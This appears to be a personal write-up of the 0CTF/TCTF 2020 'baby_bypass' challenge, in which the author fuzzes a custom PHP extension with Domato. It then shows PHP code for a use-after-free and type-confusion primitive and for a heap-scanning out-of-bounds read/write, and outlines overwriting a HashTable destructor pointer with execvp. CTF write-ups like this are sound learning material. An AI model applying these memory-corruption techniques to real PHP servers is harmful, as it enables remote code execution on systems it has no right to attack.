# 0CTF/TCTF 2020 Writeup and Thoughts
I participated in 0CTF/TCTF 2020 as part of PLUS x GoN. Although I took part in a merged team, the number of active players were very small, so we didn't do well. Also, I myself was very busy studying for the final exam, so I could only solve one challenge, `baby_bypass`. 

There were 11 pwn tasks and I could confidently say that all of them were designed really well. From my experience, CTFs that are hosted by Chinese teams usually place a lot of importance on advanced pwnables, and 0CTF was no exception. I would like to give a rating of 1000 on CTFTime if possible. 

Sadly, due to my lack of skill and time (usually I spend full 48hrs but this time I could spend less than 10hrs) I could only take a look at one challenge. But still I learned a lot from it. If I manage to get some free time, I'd like to review the Chrome challenge series and the Asmgen pwnable. I only managed to check what they're about and didn't get involved in them in depth. 


# Writeup for Baby Bypass 

## Overall 
The objective is to exploit a custom php extension. Custom php extensions are usually in the form of shared libraries. Since there were past CTF challenges regarding custom php extensions, I think you can search for these kinds of challenges for reference. Also, there are very good tutorials for building a php extension. 

The exploit primitive given is extremely powerful and easy to use. Also, since we directly interact with the interpreter heap layout is very stable. But the number of solves is small, and I think I know why. It's because it's very hard to spot the bug by static analysis. (At least that's what I think) 

There are two bugs. The first bug is free lunch. There is an OOB read in the `pwnlib_hexdump` method, since there are no bounds checks for the `offset` parameter. 

But I couldn't find the second bug for more than 5+ hours and moaned about the CTF's difficulty and my lack of intelligence for that amount of time. So I decided to use an analysis method that does not require intelligence of any sort. I fuzzed the APIs using a grammar based fuzzer. Someone had already done [this work](https://blog.jmpesp.org/2020/01/fuzzing-php-with-domato.html) using Domato, which is nice. The basic idea is to feed **grammar** to a generator, and the generator creates random scripts that adheres to the given grammar. If you've used `flex` or `bison` you should be familiar with this concept. I fed this grammar file to the fuzzer. This is only part of the file. For the full grammar file refer to [php.txt](./domatofuzzer/php.txt).

```
<functioncall> = pwnlib_u64(<fuzzstring>)
<functioncall> = pwnlib_u32(<fuzzstring>)
<functioncall> = pwnlib_p32(<fuzzint>)
<functioncall> = pwnlib_p64(<fuzzint>)
<functioncall> = pwnlib_flat(<fuzzarray>)
<functioncall> = pwnlib_remote(<fuzzstring>, <fuzzint>)
<methodcall> = <functioncall>
```

I removed `pwnlib_hexdump` on purpose because it has a high chance of crashing and I wanted to find bugs in other functions. 

To run the fuzzer I downloaded php 7.4.7 and compiled it with ASAN enabled. Then I created a Docker image for fuzzing and ran the fuzzer. Brrrrrr.... 

After like 3 seconds crashes appeared. One of them was this. 
```php
<?php

$ref_bool = true;
$ref_int = 0;
$ref_string = "a";
$ref_array = array(0);
$ref_object = new StdClass();

function templateFunction($templateParameter) {
	return 0;
}

function templateGenerator() {
	yield 0;
}

class TemplateClass {
	var $templateProperty;
	const TEMPLATE_CONSTANT = 0;
	function templateMethod() {
		return 0;
	}
}


try { try { pwnlib_p32(3); } catch (Exception $e) { } } catch(Error $e) { }
try { try { pwnlib_remote(str_repeat("%s%x%n", 0x100), 4); } catch (Exception $e) { } } catch(Error $e) { }
try { try { pwnlib_p32(4294967296); } catch (Exception $e) { } } catch(Error $e) { }
try { try { pwnlib_remote(implode(array_map(function($c) {return "\\x" . str_pad(dechex($c), 2, "0");}, range(0, 255))), 1000000); } catch (Exception $e) { } } catch(Error $e) { }
try { try { pwnlib_u32(implode(array_map(function($c) {return "\\x" . str_pad(dechex($c), 2, "0");}, range(0, 255)))); } catch (Exception $e) { } } catch(Error $e) { }
try { try { pwnlib_u32(implode(array_map(function($c) {return "\\x" . str_pad(dechex($c), 2, "0");}, range(0, 255)))); } catch (Exception $e) { } } catch(Error $e) { }
try { try { pwnlib_u32(str_repeat("A", 0x100)); } catch (Exception $e) { } } catch(Error $e) { }
try { try { pwnlib_u64(str_repeat(chr(158), 17)); } catch (Exception $e) { } } catch(Error $e) { }
try { try { pwnlib_flat(range(0, 10)); } catch (Exception $e) { } } catch(Error $e) { }
try { try { pwnlib_flat(array("a" => 1, "b" => "2", "c" => 3.0)); } catch (Exception $e) { } } catch(Error $e) { }
try { try { pwnlib_p32(100); } catch (Exception $e) { } } catch(Error $e) { }
try { try { pwnlib_u32(str_repeat("A", 0x100)); } catch (Exception $e) { } } catch(Error $e) { }
try { try { pwnlib_u32(str_repeat("%s%x%n", 0x100)); } catch (Exception $e) { } } catch(Error $e) { }
try { try { pwnlib_p64(1); } catch (Exception $e) { } } catch(Error $e) { }
try { try { pwnlib_u32(str_repeat(chr(221), 4097)); } catch (Exception $e) { } } catch(Error $e) { }
try { try { pwnlib_remote(implode(array_map(function($c) {return "\\x" . str_pad(dechex($c), 2, "0");}, range(0, 255))), 100); } catch (Exception $e) { } } catch(Error $e) { }
try { try { pwnlib_u32(str_repeat(chr(0), 65537)); } catch (Exception $e) { } } catch(Error $e) { }
try { try { pwnlib_remote(str_repeat(chr(152), 17), 1000000); } catch (Exception $e) { } } catch(Error $e) { }
try { try { pwnlib_p32(10); } catch (Exception $e) { } } catch(Error $e) { }
try { try { pwnlib_u32(str_repeat("%s%x%n", 0x100)); } catch (Exception $e) { } } catch(Error $e) { }
try { try { pwnlib_u64(str_repeat(chr(38), 4097) + str_repeat(chr(185), 65537)); } catch (Exception $e) { } } catch(Error $e) { }
try { try { pwnlib_u32(str_repeat("A", 0x100)); } catch (Exception $e) { } } catch(Error $e) { }
try { try { pwnlib_remote(str_repeat(chr(84), 65537), 2); } catch (Exception $e) { } } catch(Error $e) { }
try { try { pwnlib_u64(str_repeat("%s%x%n", 0x100)); } catch (Exception $e) { } } catch(Error $e) { }
try { try { pwnlib_flat(array("a" => 1, "b" => "2", "c" => 3.0)); } catch (Exception $e) { } } catch(Error $e) { }
try { try { pwnlib_p64(-1); } catch (Exception $e) { } } catch(Error $e) { }
try { try { pwnlib_p64(1000000); } catch (Exception $e) { } } catch(Error $e) { }
try { try { pwnlib_p32(4); } catch (Exception $e) { } } catch(Error $e) { }
try { try { pwnlib_u32(str_repeat(chr(103), 1025) + str_repeat(chr(206), 1025) + str_repeat(chr(18), 65)); } catch (Exception $e) { } } catch(Error $e) { }
try { try { pwnlib_flat(array("a" => 1, "b" => "2", "c" => 3.0)); } catch (Exception $e) { } } catch(Error $e) { }
try { try { pwnlib_flat(range(0, 10)); } catch (Exception $e) { } } catch(Error $e) { }
try { try { pwnlib_p64(4); } catch (Exception $e) { } } catch(Error $e) { }
try { try { pwnlib_p32(5); } catch (Exception $e) { } } catch(Error $e) { }
try { try { pwnlib_flat(array("a" => 1, "b" => "2", "c" => 3.0)); } catch (Exception $e) { } } catch(Error $e) { }
try { try { pwnlib_remote(str_repeat(chr(53), 65537), 5); } catch (Exception $e) { } } catch(Error $e) { }
try { try { pwnlib_p32(10); } catch (Exception $e) { } } catch(Error $e) { }
try { try { pwnlib_u32(str_repeat(chr(113), 65) + str_repeat(chr(47), 17) + str_repeat(chr(135), 4097)); } catch (Exception $e) { } } catch(Error $e) { }
try { try { pwnlib_remote(str_repeat("%s%x%n", 0x100), 5); } catch (Exception $e) { } } catch(Error $e) { }
try { try { pwnlib_remote(str_repeat("%s%x%n", 0x100), 0); } catch (Exception $e) { } } catch(Error $e) { }
try { try { pwnlib_p32(3); } catch (Exception $e) { } } catch(Error $e) { }
try { try { pwnlib_flat(range(0, 10)); } catch (Exception $e) { } } catch(Error $e) { }
try { try { pwnlib_u32(str_repeat("%s%x%n", 0x100)); } catch (Exception $e) { } } catch(Error $e) { }
try { try { pwnlib_u32(str_repeat("%s%x%n", 0x100)); } catch (Exception $e) { } } catch(Error $e) { }
try { try { pwnlib_flat(array("a" => 1, "b" => "2", "c" => 3.0)); } catch (Exception $e) { } } catch(Error $e) { }
try { try { pwnlib_flat(array("a" => 1, "b" => "2", "c" => 3.0)); } catch (Exception $e) { } } catch(Error $e) { }
try { try { pwnlib_u32(implode(array_map(function($c) {return "\\x" . str_pad(dechex($c), 2, "0");}, range(0, 255)))); } catch (Exception $e) { } } catch(Error $e) { }
try { try { pwnlib_p32(4); } catch (Exception $e) { } } catch(Error $e) { }
try { try { pwnlib_u32(str_repeat("A", 0x100)); } catch (Exception $e) { } } catch(Error $e) { }
try { try { pwnlib_u32(str_repeat("%s%x%n", 0x100)); } catch (Exception $e) { } } catch(Error $e) { }
try { try { pwnlib_p64(0); } catch (Exception $e) { } } catch(Error $e) { }
try { try { pwnlib_u32(str_repeat(chr(216), 257)); } catch (Exception $e) { } } catch(Error $e) { }
try { try { pwnlib_remote(implode(array_map(function($c) {return "\\x" . str_pad(dechex($c), 2, "0");}, range(0, 255))), -1); } catch (Exception $e) { } } catch(Error $e) { }
try { try { pwnlib_p64(1000000); } catch (Exception $e) { } } catch(Error $e) { }
try { try { pwnlib_flat(array("a" => 1, "b" => "2", "c" => 3.0)); } catch (Exception $e) { } } catch(Error $e) { }
try { try { pwnlib_p32(5); } catch (Exception $e) { } } catch(Error $e) { }
try { try { pwnlib_p32(1); } catch (Exception $e) { } } catch(Error $e) { }
try { try { pwnlib_p64(1000); } catch (Exception $e) { } } catch(Error $e) { }
try { try { pwnlib_p32(1); } catch (Exception $e) { } } catch(Error $e) { }
try { try { pwnlib_p32(5); } catch (Exception $e) { } } catch(Error $e) { }
try { try { pwnlib_remote(str_repeat(chr(39), 17) + str_repeat(chr(249), 1025), 1000); } catch (Exception $e) { } } catch(Error $e) { }
try { try { pwnlib_remote(implode(array_map(function($c) {return "\\x" . str_pad(dechex($c), 2, "0");}, range(0, 255))), -4294967295); } catch (Exception $e) { } } catch(Error $e) { }
try { try { pwnlib_p32(1000000); } catch (Exception $e) { } } catch(Error $e) { }
try { try { pwnlib_remote(str_repeat(chr(223), 1025), 5); } catch (Exception $e) { } } catch(Error $e) { }
try { try { pwnlib_flat(range(0, 10)); } catch (Exception $e) { } } catch(Error $e) { }
try { try { pwnlib_p32(1); } catch (Exception $e) { } } catch(Error $e) { }
try { try { pwnlib_p32(1000000); } catch (Exception $e) { } } catch(Error $e) { }
try { try { pwnlib_u32(str_repeat(chr(23), 65537) + str_repeat(chr(89), 65537) + str_repeat(chr(109), 17)); } catch (Exception $e) { } } catch(Error $e) { }
try { try { pwnlib_u32(implode(array_map(function($c) {return "\\x" . str_pad(dechex($c), 2, "0");}, range(0, 255)))); } catch (Exception $e) { } } catch(Error $e) { }
try { try { pwnlib_p32(-1073741823); } catch (Exception $e) { } } catch(Error $e) { }
try { try { pwnlib_u64(str_repeat(chr(142), 257) + str_repeat(chr(181), 257) + str_repeat(chr(20), 65)); } catch (Exception $e) { } } catch(Error $e) { }
try { try { pwnlib_u64(str_repeat(chr(209), 17) + str_repeat(chr(76), 65)); } catch (Exception $e) { } } catch(Error $e) { }
try { try { pwnlib_p32(10); } catch (Exception $e) { } } catch(Error $e) { }
try { try { pwnlib_remote(str_repeat(chr(92), 65) + str_repeat(chr(157), 1025), 100); } catch (Exception $e) { } } catch(Error $e) { }
try { try { pwnlib_u64(implode(array_map(function($c) {return "\\x" . str_pad(dechex($c), 2, "0");}, range(0, 255)))); } catch (Exception $e) { } } catch(Error $e) { }
try { try { pwnlib_flat(array("a" => 1, "b" => "2", "c" => 3.0)); } catch (Exception $e) { } } catch(Error $e) { }
try { try { pwnlib_p32(4); } catch (Exception $e) { } } catch(Error $e) { }
try { try { pwnlib_remote(str_repeat("A", 0x100), 0); } catch (Exception $e) { } } catch(Error $e) { }
try { try { pwnlib_u32(implode(array_map(function($c) {return "\\x" . str_pad(dechex($c), 2, "0");}, range(0, 255)))); } catch (Exception $e) { } } catch(Error $e) { }
try { try { pwnlib_u32(str_repeat(chr(133), 1025) + str_repeat(chr(59), 1025)); } catch (Exception $e) { } } catch(Error $e) { }
try { try { pwnlib_u64(str_repeat("%s%x%n", 0x100)); } catch (Exception $e) { } } catch(Error $e) { }
try { try { pwnlib_p32(-1); } catch (Exception $e) { } } catch(Error $e) { }
try { try { pwnlib_p32(2); } catch (Exception $e) { } } catch(Error $e) { }
try { try { pwnlib_remote(str_repeat("%s%x%n", 0x100), -4294967295); } catch (Exception $e) { } } catch(Error $e) { }
try { try { pwnlib_remote(str_repeat("%s%x%n", 0x100), 2); } catch (Exception $e) { } } catch(Error $e) { }
try { try { pwnlib_u64(str_repeat(chr(120), 65) + str_repeat(chr(181), 65537) + str_repeat(chr(203), 17)); } catch (Exception $e) { } } catch(Error $e) { }
try { try { pwnlib_p32(4); } catch (Exception $e) { } } catch(Error $e) { }
try { try { pwnlib_p32(100); } catch (Exception $e) { } } catch(Error $e) { }
try { try { pwnlib_u32(str_repeat(chr(57), 4097) + str_repeat(chr(178), 1025)); } catch (Exception $e) { } } catch(Error $e) { }
try { try { pwnlib_u32(implode(array_map(function($c) {return "\\x" . str_pad(dechex($c), 2, "0");}, range(0, 255)))); } catch (Exception $e) { } } catch(Error $e) { }
try { try { pwnlib_p32(10); } catch (Exception $e) { } } catch(Error $e) { }
try { try { pwnlib_remote(implode(array_map(function($c) {return "\\x" . str_pad(dechex($c), 2, "0");}, range(0, 255))), 0); } catch (Exception $e) { } } catch(Error $e) { }
try { try { pwnlib_u64(str_repeat(chr(187), 17) + str_repeat(chr(204), 65)); } catch (Exception $e) { } } catch(Error $e) { }
try { try { pwnlib_flat(range(0, 10)); } catch (Exception $e) { } } catch(Error $e) { }
try { try { pwnlib_p32(1000000); } catch (Exception $e) { } } catch(Error $e) { }
try { try { pwnlib_u32(str_repeat("%s%x%n", 0x100)); } catch (Exception $e) { } } catch(Error $e) { }
try { try { pwnlib_u32(str_repeat("A", 0x100)); } catch (Exception $e) { } } catch(Error $e) { }
try { try { pwnlib_u64(implode(array_map(function($c) {return "\\x" . str_pad(dechex($c), 2, "0");}, range(0, 255)))); } catch (Exception $e) { } } catch(Error $e) { }
try { try { pwnlib_p64(5); } catch (Exception $e) { } } catch(Error $e) { }
try { try { pwnlib_u64(str_repeat("A", 0x100)); } catch (Exception $e) { } } catch(Error $e) { }
try { try { pwnlib_p64(2); } catch (Exception $e) { } } catch(Error $e) { }
?>
```

It's very long and meaningless. So we need to reduce this testcase. At first I thought of using a reducer script but I just reduced it by hand after realizing my reducer is stripping away everything. I remoed `pwnlib_u*` and `pwnlib_p*` calls since they have a very low chance of having bugs. Reducing the testcase gave me this. 

```php
pwnlib_flat(range(0, 10));
pwnlib_flat(array("a" => 1, "b" => "2", "c" => 3.0));
```

After attaching this to a debugger I realized that the `HashTable` structure of `range(0, 10)` is corrupted. There is a function pointer (destructor) in `HashTable`, and it was tampered to a bad value, causing RIP to jump to a bad address. 

The `HashTable` structure is the following. 

```c
typedef struct _zend_array HashTable;

struct _zend_array {
	zend_refcounted_h gc;
	union {
		struct {
			ZEND_ENDIAN_LOHI_4(
				zend_uchar    flags,
				zend_uchar    _unused,
				zend_uchar    nIteratorsCount,
				zend_uchar    _unused2)
		} v;
		uint32_t flags;
	} u;
	uint32_t          nTableMask;
	Bucket           *arData;
	uint32_t          nNumUsed;
	uint32_t          nNumOfElements;
	uint32_t          nTableSize;
	uint32_t          nInternalPointer;
	zend_long         nNextFreeElement;
	dtor_func_t       pDestructor;
};
``` 

The most important field is `arData`, which is a backing vector for the array. Also there is the function pointer `pDestructor`, and as its name implies it is called when the array is dropped. 

I speculated that `pwnlib_flat` makes the reference count of `range(0, 10)` 0 and causes it to be freed. Then, some other object reclaims the `HashTable` structure deallocated from line1, and `range(0, 10)` is tampered. 

I confirmed my 'theory' with the following poc.

```php
$my_range = range(0,10);
pwnlib_flat($my_range);
$second = range(0, 255);
print_r($my_range);
```

The expected output is to print from 0 to 10 but the program printed 0 to 255, meaning that `$my_range` is freed and reclaimed by `$second`. 

Since `struct HashTable` is 56 bytes, we can reclaim a `struct HashTable` by allocating a string of 24 bytes. This is because a 32 byte header is appended to the string payload when it is created. I figured out the struct size by adding a `printf("%d\n", sizeof(HashTable))` to the php source code, but you can also figure this out by looking at IDA and looking at the arguments that are passed to `emalloc`. 

So this is my exploit primitive. 

```php
function create_awesome_objects() {
    $uaf = range(0, 10);
    pwnlib_flat($uaf);
    $reclaim1 = str_repeat("A", 24);
    // drop uaf once more, which results in dropping $reclaim
    $uaf = null;
    $reclaim2 = range(0,10);
    if (strlen($reclaim1) < 10000000) {
        die("[-] Failed to create magic string");
    }
    return array($reclaim1, $reclaim2);
}
```

A brief explanation of what's happening. 
(1) `$uaf` is first freed by `pwnlib_flat`. 
(2) `$reclaim1` reclaims the `HashTable` of `$uaf`. 
(3) Free `$uaf` once more by dropping its reference. This action also frees the `zend_string` structure of `$reclaim`. 
(4) `$reclaim2` is reclaims this address. As a result, `$reclaim2` is a array and `$reclaim1` is a string, but their `zval` values point to the same address. 

This is the definition of `zend_string`. 

```c
struct _zend_string {
	zend_refcounted_h gc;
	zend_ulong        h;                /* hash value */
	size_t            len;
	char              val[1];
};
```

You can see that, there are no pointer fields in `zend_string`, so it is rather easy to forge a valid `zend_string` structure. 

At offset 0x10 `HashTable` is a pointer field (`arData`) and `zend_string` has the `len` field. Therefore, as `$reclaim2` relcaims the address, the length field of `$reclaim1` becomes a pointer which is in the form of 0x7FFFXXXXXXXX. 

Now we have two really powerful primitives: **1. Arbitrary forging of HashTable struct, 2. Heap out of bounds read/write**. 

There is one limitation though. The arbitrary forging of HashTable is actual partial, because the string payload (`val`) is at offset 0x18, and therefore we can only control the contents after offset 0x18. Luckily the function pointer (`pdestructor`) is at a offset higher than 0x18, but the first argument passed to the function pointer is a value located at offset 0x10. So we need to find a way to control the entire structure, and that is where the Heap OOB comes into play.

I used the Heap OOB by creating a pair of (string, array), (string, array) and overflowing the contents of another string from the preceding string. The distance between them was calculated via 'heap scanning'. The following code implements it. 

```php
// either 1 or 2 must be in front of the other
$marker1 = str_repeat(pwnlib_p32(0xcccccccc), 4);
$marker2 = str_repeat(pwnlib_p32(0xdddddddd), 4);

for ($i = 0; $i < 0x10; $i++) {
    $write_object1[$i] = $marker1[0];
    $write_object2[$i] = $marker2[0];
}

for ($i = 0; $i < 0x100000; $i++) {
    $slice1 = pwnlib_u64(substr($write_object1, $i*8, 0x8));
    $slice2 = pwnlib_u64(substr($write_object2, $i*8, 0x8));
    if ($slice1 == strlen($write_object2)) {
        if (substr($write_object1, $i*8+8, 0x10) == $marker2) {
            $offset = $i*8;
            print("[+] Found offset\n");
            break;
        }
    }
    if ($slice2 == strlen($write_object1)) {
        die("[!] I didn't assume this would happen");
    }
}
```

Basically it searches for a matching `strlen($string)` and string content to locate the other string. Since we don't know the order of allocation between the two strings we scan in both directions. 

Now rest is easy. Leak the PIE base by reading the original value of the function pointer. Then, set the arguments appropirately. Finally, change the function pointer to `execvp@plt` and trigger the destructor by dropping the reference.  

